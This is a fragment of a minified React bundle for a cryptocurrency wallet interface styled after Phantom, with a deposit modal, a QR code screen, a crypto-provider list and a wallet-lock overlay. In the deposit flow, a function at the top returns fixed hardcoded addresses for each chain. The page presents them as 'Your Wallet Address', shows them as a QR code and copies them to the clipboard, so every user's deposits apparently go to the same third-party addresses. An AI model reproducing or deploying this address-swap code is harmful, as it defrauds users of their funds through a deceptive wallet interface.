                                let e = e => "ETH" === e || "BNB" === e || "MATIC" === e || "AVAX" === e || "USDC" === e || "USDT" === e || "UNI" === e || "LINK" === e || "SHIB" === e || "DAI" === e || "AE" === e || "CAKE" === e || "1INCH" === e || "PYUSD" === e ? "0xCe97B1acA39406D16870A5B74AC2b6eecC8a5AFB" : "BTC" === e ? "bc1qymzeudjkjxvw8v32k8newzv9q6v0cln6znlkct" : "LTC" === e ? "ltc1qw2qgw35a9yxd493k37295mharxwvswsd839wzl" : "SOL" === e ? "6YQ6BYerAFKn4FtnF2m36MdA3XpweKPfKm1sz3oekasM" : "TRX" === e ? "TDDqv4uc4h56SiDDETUCP6ZZ87o4Yfk4zY" : "TON" === e ? "UQBSFJAxO6SQKacqHJa1qiDOf_mo7DooPXVs3_8lBtJHKwfz" : "XRP" === e ? "rEoJburkFt2MBznsBwA8z7awUhHB4FN6QJ" : "DOGE" === e ? "DC7zRkPPPk7pTj5fWx1WzK2ct6RKBya3HG" : "ADA" === e ? "addr1q88wk8k6dfkxx55x7r7v7duag0uc8clpcsjrnadhg4pmlhy4pcark5xp0rx77tk69wwp90dqjunu0ugt7k8m00lamz2s4pe0m7" : "DOT" === e ? "13662qkpBBNzw3YeLW3JDg4eacL3UdUGDXod3VCSptvRcDiL" : e0,
                                    t = tg.filter(e => e.symbol.toLowerCase().includes(eq.toLowerCase()) || e.name.toLowerCase().includes(eq.toLowerCase()) || e.network.toLowerCase().includes(eq.toLowerCase()));
                                return (0, r.jsxs)("div", {
                                    style: {
                                        background: "radial-gradient(circle at top, rgba(255,255,255,0.95) 0%, rgba(248,247,253,0.96) 35%, rgba(244,241,255,0.98) 100%)",
                                        borderRadius: "24px",
                                        width: "100%",
                                        maxWidth: "420px",
                                        height: "620px",
                                        display: "flex",
                                        flexDirection: "column",
                                        boxShadow: "0 24px 80px rgba(124, 58, 237, 0.12), 0 8px 24px rgba(15, 23, 42, 0.08)",
                                        border: "1px solid rgba(174,156,255,0.18)",
                                        overflow: "hidden"
                                    },
                                    children: [(() => {
                                        let e = "",
                                            t = !1;
                                        switch (eO) {
                                            case "select":
                                                e = "Deposit";
                                                break;
                                            case "qr":
                                                e = "Deposit ".concat(eF), t = !0
                                        }
                                        return (0, r.jsxs)("div", {
                                            style: {
                                                padding: "20px 16px 16px",
                                                display: "flex",
                                                justifyContent: "space-between",
                                                alignItems: "center",
                                                position: "relative",
                                                borderBottom: "1px solid ".concat(tH("--twc-line"))
                                            },
                                            children: [t ? (0, r.jsx)("button", {
                                                onClick: () => eZ("select"),
                                                style: {
                                                    background: "rgba(255,255,255,0.55)",
                                                    border: "none",
                                                    color: tH("--twc-textPrimary"),
                                                    cursor: "pointer",
                                                    padding: "8px",
                                                    display: "flex",
                                                    alignItems: "center",
                                                    justifyContent: "center",
                                                    borderRadius: "18px",
                                                    transition: "background-color 0.2s ease",
                                                    position: "absolute",
                                                    left: "16px",
                                                    zIndex: 10
                                                },
                                                onMouseEnter: e => e.currentTarget.style.backgroundColor = tH("--twc-bg3"),
                                                onMouseLeave: e => e.currentTarget.style.backgroundColor = "transparent",
                                                children: (0, r.jsx)("svg", {
                                                    width: "24",
                                                    height: "24",
                                                    viewBox: "0 0 24 24",
                                                    fill: "currentColor",
                                                    children: (0, r.jsx)("path", {
                                                        d: "M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"
                                                    })
                                                })
                                            }) : (0, r.jsx)("div", {
                                                style: {
                                                    width: "40px"
                                                }
                                            }), (0, r.jsx)("h3", {
                                                style: {
                                                    color: tH("--twc-textPrimary"),
                                                    margin: 0,
                                                    fontSize: "18px",
                                                    fontWeight: 700,
                                                    textAlign: "center",
                                                    width: "100%",
                                                    paddingLeft: t ? "40px" : "0",
                                                    paddingRight: "40px"
                                                },
                                                children: e
                                            }), (0, r.jsx)("button", {
                                                onClick: () => eA(!1),
                                                style: {
                                                    background: tH("--twc-bg3"),
                                                    border: "none",
                                                    color: tH("--twc-iconNormal"),
                                                    cursor: "pointer",
                                                    fontSize: "20px",
                                                    padding: "8px",
                                                    borderRadius: "50%",
                                                    width: "36px",
                                                    height: "36px",
                                                    display: "flex",
                                                    alignItems: "center",
                                                    justifyContent: "center",
                                                    transition: "filter 0.35s cubic-bezier(.22,1,.36,1), transform 0.35s cubic-bezier(.22,1,.36,1), opacity 0.35s cubic-bezier(.22,1,.36,1), box-shadow 0.35s cubic-bezier(.22,1,.36,1)",
                                                    position: "absolute",
                                                    right: "16px",
                                                    zIndex: 10
                                                },
                                                onMouseEnter: e => e.currentTarget.style.backgroundColor = tH("--twc-backgroundSecondary"),
                                                onMouseLeave: e => e.currentTarget.style.backgroundColor = tH("--twc-bg3"),
                                                children: "\xd7"
                                            })]
                                        })
                                    })(), (0, r.jsxs)("div", {
                                        style: {
                                            flex: 1,
                                            overflowY: "auto",
                                            padding: "select" === eO ? "0 16px 16px" : "16px"
                                        },
                                        children: ["select" === eO && (0, r.jsxs)("div", {
                                            children: [(0, r.jsx)("div", {
                                                style: {
                                                    background: "radial-gradient(circle at top, rgba(255,255,255,0.95) 0%, rgba(248,247,253,0.96) 35%, rgba(244,241,255,0.98) 100%)",
                                                    borderRadius: "20px",
                                                    padding: "12px 16px",
                                                    marginBottom: "16px",
                                                    border: "1px solid rgba(174,156,255,0.18)"
                                                },
                                                children: (0, r.jsxs)("div", {
                                                    style: {
                                                        display: "flex",
                                                        alignItems: "center",
                                                        gap: "12px"
                                                    },
                                                    children: [(0, r.jsx)("svg", {
                                                        width: "20",
                                                        height: "20",
                                                        viewBox: "0 0 24 24",
                                                        fill: tH("--twc-iconNormal"),
                                                        children: (0, r.jsx)("path", {
                                                            d: "M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"
                                                        })
                                                    }), (0, r.jsx)("input", {
                                                        type: "text",
                                                        placeholder: "Search tokens",
                                                        value: eq,
                                                        onChange: e => eK(e.target.value),
                                                        style: {
                                                            flex: 1,
                                                            background: "rgba(255,255,255,0.55)",
                                                            border: "none",
                                                            color: tH("--twc-textPrimary"),
                                                            outline: "none",
                                                            fontSize: "16px",
                                                            fontWeight: 500
                                                        }
                                                    })]
                                                })
                                            }), (0, r.jsx)("div", {
                                                style: {
                                                    display: "flex",
                                                    flexDirection: "column",
                                                    gap: "8px"
                                                },
                                                children: t.map(e => {
                                                    let t = ty[e.symbol],
                                                        n = tb[e.symbol] || 0;
                                                    return (0, r.jsxs)("div", {
                                                        onClick: () => {
                                                            eW(e.symbol), eZ("qr")
                                                        },
                                                        style: {
                                                            display: "flex",
                                                            alignItems: "center",
                                                            padding: "12px 16px",
                                                            borderRadius: "20px",
                                                            cursor: "pointer",
                                                            background: "radial-gradient(circle at top, rgba(255,255,255,0.95) 0%, rgba(248,247,253,0.96) 35%, rgba(244,241,255,0.98) 100%)",
                                                            gap: "12px",
                                                            transition: "filter 0.35s cubic-bezier(.22,1,.36,1), transform 0.35s cubic-bezier(.22,1,.36,1), opacity 0.35s cubic-bezier(.22,1,.36,1), box-shadow 0.35s cubic-bezier(.22,1,.36,1)",
                                                            border: "1px solid rgba(174,156,255,0.18)"
                                                        },
                                                        onMouseEnter: e => {
                                                            e.currentTarget.style.backgroundColor = tH("--twc-backgroundSecondary")
                                                        },
                                                        onMouseLeave: e => {
                                                            e.currentTarget.style.backgroundColor = tH("--twc-bg3")
                                                        },
                                                        children: [(0, r.jsx)("div", {
                                                            style: {
                                                                width: "36px",
                                                                height: "36px"
                                                            },
                                                            children: (0, r.jsx)("img", {
                                                                src: tC[e.symbol],
                                                                alt: e.symbol,
                                                                style: {
                                                                    width: "100%",
                                                                    borderRadius: "50%"
                                                                }
                                                            })
                                                        }), (0, r.jsxs)("div", {
                                                            style: {
                                                                flex: 1
                                                            },
                                                            children: [(0, r.jsx)("p", {
                                                                style: {
                                                                    color: tH("--twc-textPrimary"),
                                                                    margin: 0,
                                                                    fontSize: "16px",
                                                                    fontWeight: 600
                                                                },
                                                                children: e.symbol
                                                            }), (0, r.jsxs)("p", {
                                                                style: {
                                                                    color: tH("--twc-textSecondary"),
                                                                    margin: 0,
                                                                    fontSize: "13px",
                                                                    marginTop: "2px"
                                                                },
                                                                children: [e.name, " • ", e.network]
                                                            })]
                                                        }), (0, r.jsxs)("div", {
                                                            style: {
                                                                textAlign: "right"
                                                            },
                                                            children: [(0, r.jsx)("p", {
                                                                style: {
                                                                    color: tH("--twc-textPrimary"),
                                                                    margin: 0,
                                                                    fontSize: "16px",
                                                                    fontWeight: 600
                                                                },
                                                                children: t.toFixed(2)
                                                            }), (0, r.jsxs)("p", {
                                                                style: {
                                                                    color: tH("--twc-textSecondary"),
                                                                    margin: 0,
                                                                    fontSize: "13px",
                                                                    marginTop: "2px"
                                                                },
                                                                children: ["$", (t * n).toFixed(2)]
                                                            })]
                                                        })]
                                                    }, e.symbol)
                                                })
                                            })]
                                        }), "qr" === eO && (0, r.jsxs)("div", {
                                            style: {
                                                height: "100%",
                                                display: "flex",
                                                flexDirection: "column"
                                            },
                                            children: [(0, r.jsxs)("div", {
                                                style: {
                                                    background: "radial-gradient(circle at top, rgba(255,255,255,0.95) 0%, rgba(248,247,253,0.96) 35%, rgba(244,241,255,0.98) 100%)",
                                                    borderRadius: "20px",
                                                    padding: "24px",
                                                    marginBottom: "16px",
                                                    border: "1px solid rgba(174,156,255,0.18)",
                                                    textAlign: "center",
                                                    flex: 1,
                                                    display: "flex",
                                                    flexDirection: "column",
                                                    justifyContent: "center"
                                                },
                                                children: [(0, r.jsxs)("div", {
                                                    style: {
                                                        display: "flex",
                                                        alignItems: "center",
                                                        justifyContent: "center",
                                                        gap: "12px",
                                                        marginBottom: "20px"
                                                    },
                                                    children: [(0, r.jsx)("div", {
                                                        style: {
                                                            width: "56px",
                                                            height: "56px",
                                                            borderRadius: "50%",
                                                            overflow: "hidden",
                                                            border: "1px solid rgba(174,156,255,0.18)"
                                                        },
                                                        children: (0, r.jsx)("img", {
                                                            src: tC[eF],
                                                            alt: eF,
                                                            style: {
                                                                width: "100%"
                                                            }
                                                        })
                                                    }), (0, r.jsxs)("div", {
                                                        children: [(0, r.jsx)("p", {
                                                            style: {
                                                                color: tH("--twc-textPrimary"),
                                                                margin: 0,
                                                                fontSize: "20px",
                                                                fontWeight: 700
                                                            },
                                                            children: eF
                                                        }), (0, r.jsx)("p", {
                                                            style: {
                                                                color: tH("--twc-textSecondary"),
                                                                margin: "4px 0 0",
                                                                fontSize: "16px"
                                                            },
                                                            children: tS[eF] || eF
                                                        })]
                                                    })]
                                                }), (0, r.jsx)("div", {
                                                    style: {
                                                        backgroundColor: "#fff",
                                                        borderRadius: "20px",
                                                        padding: "16px",
                                                        margin: "0 auto 20px",
                                                        width: "160px",
                                                        height: "160px",
                                                        display: "flex",
                                                        alignItems: "center",
                                                        justifyContent: "center",
                                                        border: "1px solid rgba(174,156,255,0.18)"
                                                    },
                                                    children: (0, r.jsx)("div", {
                                                        style: {
                                                            width: "130px",
                                                            height: "130px",
                                                            background: "url(https://api.qrserver.com/v1/create-qr-code/?size=130x130&data=".concat(encodeURIComponent(e(eF)), ")"),
                                                            backgroundSize: "contain",
                                                            backgroundRepeat: "no-repeat",
                                                            backgroundPosition: "center"
                                                        }
                                                    })
                                                }), (0, r.jsxs)("div", {
                                                    style: {
                                                        background: "radial-gradient(circle at top, rgba(255,255,255,0.95) 0%, rgba(248,247,253,0.96) 35%, rgba(244,241,255,0.98) 100%)",
                                                        borderRadius: "20px",
                                                        padding: "16px",
                                                        marginBottom: "16px",
                                                        border: "1px solid rgba(174,156,255,0.18)"
                                                    },
                                                    children: [(0, r.jsx)("p", {
                                                        style: {
                                                            color: tH("--twc-textSecondary"),
                                                            margin: "0 0 8px",
                                                            fontSize: "13px",
                                                            fontWeight: 500,
                                                            textAlign: "left"
                                                        },
                                                        children: "Your Wallet Address"
                                                    }), (0, r.jsxs)("div", {
                                                        style: {
                                                            display: "flex",
                                                            alignItems: "center",
                                                            gap: "12px"
                                                        },
                                                        children: [(0, r.jsx)("div", {
                                                            style: {
                                                                flex: 1,
                                                                overflow: "hidden",
                                                                minWidth: 0
                                                            },
                                                            children: (0, r.jsx)("p", {
                                                                style: {
                                                                    color: tH("--twc-textPrimary"),
                                                                    margin: 0,
                                                                    fontSize: "14px",
                                                                    fontFamily: "monospace",
                                                                    fontWeight: 500,
                                                                    whiteSpace: "nowrap",
                                                                    overflow: "hidden",
                                                                    textOverflow: "ellipsis"
                                                                },
                                                                children: e(eF)
                                                            })
                                                        }), (0, r.jsx)("button", {
                                                            onClick: () => {
                                                                navigator.clipboard.writeText(e(eF)), e_(!0), setTimeout(() => e_(!1), 2e3)
                                                            },
                                                            style: {
                                                                background: tH("--twc-bg3"),
                                                                border: "1px solid rgba(174,156,255,0.18)",
                                                                color: tH("--twc-textPrimary"),
                                                                cursor: "pointer",
                                                                fontSize: "14px",
                                                                padding: "8px 12px",
                                                                borderRadius: "18px",
                                                                fontWeight: 600,
                                                                width: "80px",
                                                                height: "36px",
                                                                transition: "filter 0.35s cubic-bezier(.22,1,.36,1), transform 0.35s cubic-bezier(.22,1,.36,1), opacity 0.35s cubic-bezier(.22,1,.36,1), box-shadow 0.35s cubic-bezier(.22,1,.36,1)",
                                                                display: "flex",
                                                                alignItems: "center",
                                                                justifyContent: "center",
                                                                gap: "6px",
                                                                flexShrink: 0
                                                            },
                                                            onMouseEnter: e => {
                                                                e.currentTarget.style.backgroundColor = tH("--twc-backgroundSecondary"), e.currentTarget.style.borderColor = tH("--twc-primary")
                                                            },
                                                            onMouseLeave: e => {
                                                                e.currentTarget.style.backgroundColor = tH("--twc-bg3"), e.currentTarget.style.borderColor = tH("--twc-line")
                                                            },
                                                            children: eH ? (0, r.jsx)("span", {
                                                                style: {
                                                                    fontSize: "14px",
                                                                    fontWeight: 600
                                                                },
                                                                children: "Copied"
                                                            }) : (0, r.jsxs)(r.Fragment, {
                                                                children: [(0, r.jsx)("svg", {
                                                                    width: "14",
                                                                    height: "14",
                                                                    viewBox: "0 0 24 24",
                                                                    fill: tH("--twc-textPrimary"),
                                                                    children: (0, r.jsx)("path", {
                                                                        d: "M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"
                                                                    })
                                                                }), (0, r.jsx)("span", {
                                                                    children: "Copy"
                                                                })]
                                                            })
                                                        })]
                                                    })]
                                                }), (0, r.jsxs)("button", {
                                                    onClick: () => {
                                                        Q(!0), et("receive")
                                                    },
                                                    style: {
                                                        width: "100%",
                                                        padding: "12px",
                                                        background: "radial-gradient(circle at top, rgba(255,255,255,0.95) 0%, rgba(248,247,253,0.96) 35%, rgba(244,241,255,0.98) 100%)",
                                                        border: "1px solid rgba(174,156,255,0.18)",
                                                        borderRadius: "20px",
                                                        cursor: "pointer",
                                                        display: "flex",
                                                        alignItems: "center",
                                                        justifyContent: "center",
                                                        gap: "8px",
                                                        transition: "filter 0.35s cubic-bezier(.22,1,.36,1), transform 0.35s cubic-bezier(.22,1,.36,1), opacity 0.35s cubic-bezier(.22,1,.36,1), box-shadow 0.35s cubic-bezier(.22,1,.36,1)",
                                                        marginTop: "8px"
                                                    },
                                                    onMouseEnter: e => {
                                                        e.currentTarget.style.backgroundColor = tH("--twc-backgroundSecondary"), e.currentTarget.style.borderColor = tH("--twc-primary")
                                                    },
                                                    onMouseLeave: e => {
                                                        e.currentTarget.style.backgroundColor = tH("--twc-bg3"), e.currentTarget.style.borderColor = tH("--twc-line")
                                                    },
                                                    children: [(0, r.jsx)("svg", {
                                                        width: "20",
                                                        height: "20",
                                                        viewBox: "0 0 24 24",
                                                        fill: tH("--twc-textPrimary"),
                                                        children: (0, r.jsx)("path", {
                                                            d: "M21 5H3V8H21V5ZM21 10.5H3V19H21V10.5ZM6 13H11V15.5H6V13ZM15.5 13H13V15.5H15.5V13Z"
                                                        })
                                                    }), (0, r.jsxs)("span", {
                                                        style: {
                                                            color: tH("--twc-textPrimary"),
                                                            fontSize: "14px",
                                                            fontWeight: 600
                                                        },
                                                        children: ["Buy ", eF, " with Providers"]
                                                    })]
                                                })]
                                            }), (0, r.jsx)("button", {
                                                onClick: () => eA(!1),
                                                style: {
                                                    width: "100%",
                                                    padding: "16px",
                                                    marginTop: "auto",
                                                    "data-phantom-primary": !0
                                                },
                                                onMouseEnter: e => e.currentTarget.style.filter = "brightness(1.03)",
                                                onMouseLeave: e => e.currentTarget.style.filter = "brightness(1)",
                                                children: "Done"
                                            })]
                                        })]
                                    })]
                                })
                            })()
                        }), q && (0, r.jsx)("div", {
                            style: {
                                position: "fixed",
                                top: 0,
                                left: 0,
                                right: 0,
                                bottom: 0,
                                backgroundColor: "rgba(248,247,253,0.82)",
                                display: "flex",
                                alignItems: "center",
                                justifyContent: "center",
                                zIndex: 9998,
                                padding: "16px",
                                animation: "fadeIn 0.3s ease-out"
                            },
                            className: "jsx-212d2f498bea9fe5",
                            children: (0, r.jsxs)("div", {
                                style: {
                                    background: "radial-gradient(circle at top, rgba(255,255,255,0.95) 0%, rgba(248,247,253,0.96) 35%, rgba(244,241,255,0.98) 100%)",
                                    borderRadius: "24px",
                                    width: "100%",
                                    maxWidth: "420px",
                                    height: "620px",
                                    display: "flex",
                                    flexDirection: "column",
                                    boxShadow: "0 24px 80px rgba(124, 58, 237, 0.12), 0 8px 24px rgba(15, 23, 42, 0.08)",
                                    border: "1px solid rgba(174,156,255,0.18)"
                                },
                                children: [(0, r.jsxs)("div", {
                                    style: {
                                        padding: "20px 24px 16px",
                                        display: "flex",
                                        justifyContent: "space-between",
                                        alignItems: "center",
                                        position: "relative",
                                        borderBottom: "1px solid ".concat(tH("--twc-line"))
                                    },
                                    children: [(0, r.jsx)("div", {
                                        style: {
                                            width: "40px"
                                        }
                                    }), (0, r.jsx)("h3", {
                                        style: {
                                            color: tH("--twc-textPrimary"),
                                            margin: 0,
                                            fontSize: "18px",
                                            fontWeight: 700,
                                            textAlign: "center",
                                            flex: 1
                                        },
                                        children: "Buy Crypto"
                                    }), (0, r.jsx)("button", {
                                        onClick: () => K(!1),
                                        style: {
                                            background: tH("--twc-bg3"),
                                            border: "none",
                                            color: tH("--twc-iconNormal"),
                                            cursor: "pointer",
                                            fontSize: "20px",
                                            padding: "8px",
                                            borderRadius: "50%",
                                            width: "36px",
                                            height: "36px",
                                            display: "flex",
                                            alignItems: "center",
                                            justifyContent: "center",
                                            transition: "filter 0.35s cubic-bezier(.22,1,.36,1), transform 0.35s cubic-bezier(.22,1,.36,1), opacity 0.35s cubic-bezier(.22,1,.36,1), box-shadow 0.35s cubic-bezier(.22,1,.36,1)"
                                        },
                                        onMouseEnter: e => e.currentTarget.style.backgroundColor = tH("--twc-backgroundSecondary"),
                                        onMouseLeave: e => e.currentTarget.style.backgroundColor = tH("--twc-bg3"),
                                        children: "\xd7"
                                    })]
                                }), (0, r.jsxs)("div", {
                                    style: {
                                        flex: 1,
                                        overflowY: "auto",
                                        padding: "24px"
                                    },
                                    children: [(0, r.jsx)("div", {
                                        style: {
                                            background: "radial-gradient(circle at top, rgba(255,255,255,0.95) 0%, rgba(248,247,253,0.96) 35%, rgba(244,241,255,0.98) 100%)",
                                            borderRadius: "20px",
                                            padding: "12px 16px",
                                            marginBottom: "20px",
                                            border: "1px solid rgba(174,156,255,0.18)"
                                        },
                                        children: (0, r.jsxs)("div", {
                                            style: {
                                                display: "flex",
                                                alignItems: "center",
                                                gap: "12px"
                                            },
                                            children: [(0, r.jsx)("svg", {
                                                width: "20",
                                                height: "20",
                                                viewBox: "0 0 24 24",
                                                fill: tH("--twc-iconNormal"),
                                                children: (0, r.jsx)("path", {
                                                    d: "M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"
                                                })
                                            }), (0, r.jsx)("input", {
                                                type: "text",
                                                placeholder: "Search providers",
                                                style: {
                                                    flex: 1,
                                                    background: "rgba(255,255,255,0.55)",
                                                    border: "none",
                                                    color: tH("--twc-textPrimary"),
                                                    outline: "none",
                                                    fontSize: "16px",
                                                    fontWeight: 500
                                                }
                                            })]
                                        })
                                    }), (0, r.jsx)("div", {
                                        style: {
                                            display: "flex",
                                            flexDirection: "column",
                                            gap: "12px"
                                        },
                                        children: tU.map((e, t) => (0, r.jsxs)("div", {
                                            onClick: () => window.open(e.url, "_blank"),
                                            style: {
                                                display: "flex",
                                                alignItems: "center",
                                                justifyContent: "space-between",
                                                padding: "16px",
                                                borderRadius: "20px",
                                                cursor: "pointer",
                                                background: "radial-gradient(circle at top, rgba(255,255,255,0.95) 0%, rgba(248,247,253,0.96) 35%, rgba(244,241,255,0.98) 100%)",
                                                transition: "filter 0.35s cubic-bezier(.22,1,.36,1), transform 0.35s cubic-bezier(.22,1,.36,1), opacity 0.35s cubic-bezier(.22,1,.36,1), box-shadow 0.35s cubic-bezier(.22,1,.36,1)",
                                                border: "1px solid rgba(174,156,255,0.18)"
                                            },
                                            onMouseEnter: e => {
                                                e.currentTarget.style.backgroundColor = tH("--twc-backgroundSecondary")
                                            },
                                            onMouseLeave: e => {
                                                e.currentTarget.style.backgroundColor = tH("--twc-bg3")
                                            },
                                            children: [(0, r.jsxs)("div", {
                                                style: {
                                                    display: "flex",
                                                    alignItems: "center",
                                                    gap: "12px",
                                                    flex: 1
                                                },
                                                children: [(0, r.jsx)("img", {
                                                    src: e.logo,
                                                    alt: e.name,
                                                    style: {
                                                        width: "48px",
                                                        height: "48px",
                                                        borderRadius: "20px"
                                                    }
                                                }), (0, r.jsxs)("div", {
                                                    style: {
                                                        flex: 1
                                                    },
                                                    children: [(0, r.jsx)("p", {
                                                        style: {
                                                            color: tH("--twc-textPrimary"),
                                                            margin: 0,
                                                            fontSize: "16px",
                                                            fontWeight: 600
                                                        },
                                                        children: e.name
                                                    }), (0, r.jsx)("div", {
                                                        style: {
                                                            display: "flex",
                                                            gap: "8px",
                                                            marginTop: "4px",
                                                            flexWrap: "wrap"
                                                        },
                                                        children: e.features.map((e, t) => (0, r.jsx)("span", {
                                                            style: {
                                                                fontSize: "11px",
                                                                padding: "2px 6px",
                                                                background: "radial-gradient(circle at top, rgba(255,255,255,0.95) 0%, rgba(248,247,253,0.96) 35%, rgba(244,241,255,0.98) 100%)",
                                                                color: tH("--twc-textSecondary"),
                                                                borderRadius: "4px",
                                                                fontWeight: 500,
                                                                marginBottom: "2px"
                                                            },
                                                            children: e
                                                        }, t))
                                                    }), (0, r.jsxs)("div", {
                                                        style: {
                                                            display: "flex",
                                                            alignItems: "center",
                                                            gap: "8px",
                                                            marginTop: "8px"
                                                        },
                                                        children: [(0, r.jsx)("div", {
                                                            style: {
                                                                display: "flex",
                                                                gap: "2px"
                                                            },
                                                            children: [void 0, void 0, void 0, void 0, void 0].map((t, n) => (0, r.jsx)("svg", {
                                                                width: "12",
                                                                height: "12",
                                                                viewBox: "0 0 24 24",
                                                                fill: n < Math.floor(e.stars) || n < e.stars ? "#FFD700" : tH("--twc-textDisabled"),
                                                                children: (0, r.jsx)("path", {
                                                                    d: "M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"
                                                                })
                                                            }, n))
                                                        }), (0, r.jsxs)("span", {
                                                            style: {
                                                                fontSize: "12px",
                                                                color: tH("--twc-textSecondary")
                                                            },
                                                            children: [e.rating, " (", e.reviews, ")"]
                                                        })]
                                                    })]
                                                })]
                                            }), (0, r.jsxs)("svg", {
                                                width: "22",
                                                height: "22",
                                                viewBox: "0 0 22 22",
                                                fill: tH("--twc-textPrimary"),
                                                children: [(0, r.jsx)("rect", {
                                                    width: "5",
                                                    height: "2.5",
                                                    transform: "matrix(1.19249e-08 -1 -1 -1.19249e-08 20 20)"
                                                }), (0, r.jsx)("rect", {
                                                    width: "16",
                                                    height: "2.5",
                                                    transform: "matrix(1.19249e-08 -1 -1 -1.19249e-08 6.5 20)"
                                                }), (0, r.jsx)("rect", {
                                                    width: "2.5",
                                                    height: "16",
                                                    transform: "matrix(1.19249e-08 -1 -1 -1.19249e-08 20 20)"
                                                }), (0, r.jsx)("rect", {
                                                    width: "2.5",
                                                    height: "5",
                                                    transform: "matrix(1.19249e-08 -1 -1 -1.19249e-08 9 6.5)"
                                                }), (0, r.jsx)("path", {
                                                    fillRule: "evenodd",
                                                    clipRule: "evenodd",
                                                    d: "M16.9822 5.23223L8.49695 13.7175L10.2647 15.4853L18.75 7L17.8661 6.11612L16.9822 5.23223Z"
                                                }), (0, r.jsx)("path", {
                                                    d: "M20 12L20 4L12 4L20 12Z"
                                                })]
                                            })]
                                        }, t))
                                    })]
                                })]
                            })
                        }), em && (0, r.jsx)("div", {
                            style: {
                                position: "fixed",
                                inset: 0,
                                backgroundColor: "rgba(0, 0, 0, 0.9)",
                                display: "flex",
                                alignItems: "center",
                                justifyContent: "center",
                                zIndex: 9999,
                                animation: "fadeIn 0.3s ease-out"
                            },
                            className: "jsx-212d2f498bea9fe5",
                            children: (0, r.jsxs)("div", {
                                style: {
                                    textAlign: "center"
                                },
                                className: "jsx-212d2f498bea9fe5",
                                children: [(0, r.jsx)("div", {
                                    style: {
                                        width: "60px",
                                        height: "60px",
                                        border: "4px solid transparent",
                                        borderTopColor: tH("--twc-primary"),
                                        borderRightColor: tH("--twc-primary"),
                                        borderRadius: "50%",
                                        animation: "spin 1s linear infinite",
                                        margin: "0 auto 20px",
                                        boxShadow: "0 0 30px rgba(124, 58, 237, 0.22)"
                                    },
                                    className: "jsx-212d2f498bea9fe5"
                                }), (0, r.jsx)("p", {
                                    style: {
                                        color: tH("--twc-textPrimary"),
                                        fontSize: "16px",
                                        fontWeight: 600,
                                        margin: 0
                                    },
                                    className: "jsx-212d2f498bea9fe5",
                                    children: "Locking Wallet..."
                                })]
                            })
                        })]
                    })]
                })
            }
        }
    }
]);
